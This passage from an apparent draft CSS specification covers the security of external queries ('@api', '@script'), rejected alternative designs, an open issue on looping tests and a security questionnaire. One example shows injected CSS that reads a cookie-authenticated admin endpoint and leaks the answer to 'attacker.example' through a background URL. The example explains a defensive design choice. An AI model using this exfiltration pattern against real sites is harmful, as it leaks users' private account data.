A [=query module=] runs with the page's own privileges and reads only what the page's script can read, so it
exposes nothing new. It never runs where page script couldn't: not when scripting is disabled, not without a
secure context, and not against the page's Content Security Policy.


<h2 id=security>Security considerations</h2>

<h3 id=security-api>Reading answers into style</h3>

An answer changes style, and page script can read style with <code>getComputedStyle()</code>, so an answer is
readable by the page. Cross-origin APIs therefore have to opt in with CORS, as web fonts do.

That isn't enough for the page's own origin. If an attacker can inject CSS into a page, as through a style
attribute or a user-supplied theme, they could ask the site's own APIs, which receive the user's cookies, and
send the answer out by loading a <<url>> under '@param':

<div class=example id=example-attack>
    <pre highlight=css>
    @api --admin url("/api/account/is-admin");
    @param(--admin) { body { background: url(https://attacker.example/?admin) } }
    </pre>
</div>

This is why answers need the <code>application/external-query+json</code> media type: ordinary APIs don't send
it, so they never answer a style sheet. Every endpoint that does send it should assume that any CSS in the page,
including injected CSS, can read its answers. ''@import'' guards against the same attack, reading a site's data
as CSS, by refusing cross-origin responses that aren't served as <code>text/css</code>.

<h3 id=security-values>Questions from any style sheet</h3>

Any style sheet in the document can ask a declared source a question, including a third-party style sheet and
injected CSS, and can choose the values. Endpoints and query modules should treat values as untrusted input, as
they would treat query parameters from any request.

Any style sheet can also declare a name again, and the last declaration wins, so a later style sheet can point
another style sheet's questions at a different source. This only changes which styles apply, which a later style
sheet can already do directly. It can't make a third-party style sheet load a query module, because only
same-origin style sheets can declare one.

<h3 id=security-script>Script started from CSS</h3>

Until now, CSS couldn't start script. '@script' can, so injected CSS could try to use it to run code. Defenses:

* Only style sheets with the document's origin can declare a query module, so a third-party style sheet, such
    as one from a CDN or a theme marketplace, can't.
* The module is checked against [=script-src=] like any module script. It carries no nonce, and
    <code>&#39;strict-dynamic&#39;</code> doesn't trust it, so a page with a nonce-based policy must allow each
    query module by URL or by hash.
* ''integrity()'' pins a module to known contents, so a changed or compromised host, such as a CDN, can't
    swap in other code.
* A page whose policy allows scripts only by hash allows exactly the query modules it lists. Injected CSS can
    declare other modules, but they won't run.
* Nothing runs when scripting is disabled or without a secure context.

What remains: on a page whose policy allows scripts by URL, such as with <code>&#39;self&#39;</code>, CSS
injected into a same-origin style sheet can declare and ask any module the policy allows, which runs that
module's top-level code. A module written for other purposes may do something harmful when it runs.

A query module doesn't have to opt in to being loaded from CSS, for example with a response header. This follows
<code>&lt;script type=module></code> and <code>CSS.paintWorklet.addModule()</code>, which ask nothing of a module
beyond being served as JavaScript and passing the page's policy. A page that wants tighter control allows its
query modules by hash and declares them with ''integrity()''.

<h3 id=security-dos>Many questions</h3>

Each distinct set of values is a request or a call. A style sheet can already make many requests with <<url>>
values. A user agent may limit the number of tests for each source, and treat tests past the limit as
[=test/state/error=] ''@error/unavailable''.


<h2 id=alternate-proposals>Alternate proposals</h2>

<h3 id=alt-nested>Sources wrapped around their questions</h3>

An earlier draft put the questions inside the source:

<div class=example id=example-alt-nested>
    <pre highlight=css>
    @api url("https://moon.example/phase") {
      @param("full") { … }
      @error(404) { … }
    }
    </pre>
</div>

It keeps a source and its questions together, but it can't ask two sources in one condition except by nesting
one inside the other, which can only mean "and". ''param()'' needed a source around it, so style rules directly
inside the source had to apply unconditionally, and ''param()'' anywhere else had to be false. Named sources
follow ''@custom-media'', ''@font-face'', and ''@keyframes'': declare a name once, use it anywhere.

<h3 id=alt-registered>Sources registered by page script</h3>

Instead of CSS loading a module, page script could declare a source:

<div class=example id=example-alt-registered>
    <pre highlight=js>
    CSS.externalQueries.define("--moon-calc", (name) => phaseOn(new Date()) === name);
    </pre>
    <pre highlight=css>
    @param(--moon-calc, "full") { … }
    </pre>
</div>

This is the direction the CSS Working Group has taken whenever script has fed media queries: the long-standing
issue for script-based custom media queries in [[MEDIAQUERIES-5]] sets values with
<code>CSS.customMedia.set()</code>, and the script control of user preferences that the group adopted in 2024
sets them with <code>navigator.preferences</code>. In both, page script pushes a value and CSS never loads
code, which closes [[#security-script]] entirely.

It wasn't chosen because it loses the timing: the page's script has to load and run before CSS can ask, so a
style sheet can't wait a short, fixed time for the answer the way it waits for a web font. A query that isn't
defined yet is unknown, and the CSS Working Group's discussion of script-defined media queries found the same
problem, that without script such a query is never true. Because questions use only names, this could be added
later beside '@script' without changing how questions are asked.

<h3 id=alt-match-response>Matching the response instead of asking for each value</h3>

An '@api' source could be fetched once and its response compared to each '@param' value, like a switch. That
needs one request instead of one per value, and works with existing APIs that return a value. It wasn't chosen
because every question in this specification has a true-or-false answer, which keeps '@api' and '@script' the
same, and lets a source answer questions a fixed value can't, such as
<code>@param(--moon, "between", 10, 20)</code>.

<h3 id=alt-batching>Several questions in one request</h3>

A user agent could send all the questions for one '@api' source in one request and get back an answer for each.
That would save requests when a page asks one source many questions. It wasn't chosen because:

* Web fonts don't do it. Each ''@font-face'' file is its own request, fetched only when the page uses it, even
    when a family is split into many files.
* HTTP/2 and HTTP/3 already send many small requests over one connection.
* Every endpoint would have to accept a second request and response format, and a question's answer would
    depend on which other questions happened to be asked with it, which also makes answers harder to cache.

<h3 id=alt-media>Media features</h3>

The questions could be media features, as in <code>@media (--moon-phase: "full")</code>, which would also work
in <code>matchMedia()</code> and HTML <code>media</code> attributes. Media queries are answered at once, from
the state of the device, everywhere they appear; an answer that arrives seconds later from a network or a script
doesn't fit them.

<h3 id=alt-worklet>Query modules in a worklet</h3>

A query module could run in a worklet, as paint worklets do, isolated from the page. It couldn't loop with style
or read the page's state, which removes [[#cycles]] and most of [[#security-script]]. It wasn't chosen because
reading the page's state is what most query modules are for.


<h2 id=open-issues>Open issues</h2>

<div class=issue id=issue-stop-loops>
    How should a test whose answer keeps flipping be handled, and does it need a way to stop? This needs more
    discussion.

    **Option 1: no stop.** This draft follows <code>ResizeObserver</code> ([[#script-refresh]]): a flipping test
    is asked at most once per frame, forever, and reported to the developer console. The page never hangs, and no
    test that legitimately changes often, such as one that follows an animation, is ever cut off by mistake. The
    cost is that a buggy test can make the page flicker for as long as it is open, and the author learns about it
    only from the console.

    **Option 2: a way to stop.** This would need answers to three questions.

    **Who stops it?**

    * The user agent, after a test's answer has changed in each of a set number of consecutive renderings. For
        example, 10 renderings is about a sixth of a second at 60 frames per second. This needs no author action,
        but any fixed number is a guess, and a test that legitimately changes every frame, such as one that
        follows an animation, would be stopped by mistake.
    * The author, with a limit on the declaration: <code>@script --x url("/q.js" max-changes(10/1s));</code>,
        or a keyword such as <code>once</code>, which ignores refreshes altogether. This puts the choice with
        the person who knows what the module does, but most authors won't know a loop is possible until they see
        one.
    * The module, which already receives an <code>AbortSignal</code> in <code>watch()</code>. The user agent
        could abort it with a <code>"loop"</code> reason, telling the module to stop calling
        <var>refresh</var>, while leaving the decision about what to do to the module.

    **What does the test show once stopped?**

    * Its last answer: the page stops changing, but which of the two states it stops in is a matter of timing.
    * False: predictable, but it may be the wrong state.
    * An error, with a new <<error-kind>> such as <code>loop</code>: neither '@param' nor its
        <code>not</code> applies, and <code>@error(--x, loop)</code> can style a fallback on purpose. This
        fits how this specification already treats every other failure.

    **Can it start again?** A stopped test could stay stopped for the rest of the document, or be asked again
    after the next explicit <var>refresh</var> that follows a pause of, say, one second.

    These pieces can be combined in several ways. For example, the user agent could stop a test after a number of
    consecutive changes, set it to an error with the kind <code>loop</code>, and abort the module's
    <code>watch()</code> signal with the reason <code>"loop"</code>. Or the author could opt in with a limit on
    the declaration, and tests without one would behave as in Option 1.
</div>
<h2 id=questionnaire class=no-num>Appendix: Security and privacy questionnaire</h2>

*This section is non-normative.* These are the answers to the questions in
[[SECURITY-PRIVACY-QUESTIONNAIRE]].

: What information does this feature expose, and for what purposes?
:: To a style sheet, true-or-false answers from an API or from the page's own script, so the page can be styled
    by them.
: Do features in your specification expose the minimum amount of information necessary?
:: Yes. Each answer is one bit, and an '@api' request carries only values written in a style sheet.
: Do the features expose personal information, PII, or information derived from either?
:: Only what the API or the page's script chooses to answer.
: How do the features deal with sensitive information?
:: Answers from the page's own origin are limited to endpoints that serve the external query media type. See
    [[#security-api]].
: Does data exposed carry related but distinct information that may not be obvious to users?
:: An '@api' request under an ''@media'' rule reveals that the media query matched, as any conditional request
    does.
: Do the features introduce state that persists across browsing sessions?
:: No. Answers last for one document.
: Do the features expose information about the underlying platform to origins?
:: No.
: Does this specification allow an origin to send data to the underlying platform?
:: No.
: Do features enable access to device sensors?
:: No.
: Do features enable new script execution or loading mechanisms?
:: Yes. '@script' loads and runs a JavaScript module from a style sheet. See [[#security-script]].
: Do features allow an origin to access other devices?
:: No.
: Do features allow an origin some measure of control over a user agent's native UI?
:: No.
: What temporary identifiers do the features create or expose to the web?
:: None.
: How does this specification distinguish between behavior in first-party and third-party contexts?
:: Cross-origin APIs must opt in with CORS, and receive cookies only with
    <code>cross-origin(use-credentials)</code>, under the user agent's third-party cookie rules. Third-party
    style sheets can't declare query modules.
: How do the features work in the context of a browser's Private Browsing or Incognito mode?
:: The same way.
: Does this specification have both "Security Considerations" and "Privacy Considerations" sections?
:: Yes.
: Do features enable origins to downgrade default security protections?
:: No.
: What happens when a document that uses your feature is kept alive in BFCache?
:: Answers are kept. A query module's refreshes resume when the document is restored.
: What happens when a document that uses your feature gets disconnected?
:: Nothing is kept.
: Does your spec define when and how new kinds of errors should be raised?
:: It defines when a test is in an error state, which '@error' rules can style. The
    {{ExternalQuery/answered}} promise then rejects with a "<code>NetworkError</code>" or, for an abandoned test,
    an "<code>AbortError</code>" {{DOMException}}. Nothing is thrown.
: Does your feature allow sites to learn about the user's use of assistive technology?
:: No.
: What should this questionnaire have asked?
:: Whether a feature lets a language that couldn't run script start it.
